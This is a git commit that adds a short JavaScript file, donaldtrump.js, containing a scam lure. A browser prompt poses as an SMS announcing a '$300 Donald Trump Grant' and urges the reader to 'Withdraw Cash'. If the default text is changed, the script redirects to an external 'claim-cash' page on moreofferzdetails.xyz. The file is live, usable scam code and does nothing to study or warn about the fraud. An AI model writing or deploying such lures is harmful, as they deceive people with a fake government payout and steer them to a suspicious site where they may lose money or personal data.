50538846e2f21bcdeaef1d92e63911e2a5e88660
bigetijazz4 <bigetijazz4@gmail.com>
2024-11-06 04:18:28 -0800

    Create donaldtrump.js

---
+++ donaldtrump.js
@@ -0,0 +1,6 @@
+
+var password = 'Withdraw $300'
+password=prompt('SMS: Congratulations you are among the lucky people to receive $300 Donald Trump Grant, Kindly press Ok to Withdraw Cash ','Withdraw $300');
+if (password != 'Withdraw $300') {
+location.href='https://www.moreofferzdetails.xyz/claim-cash';
+}
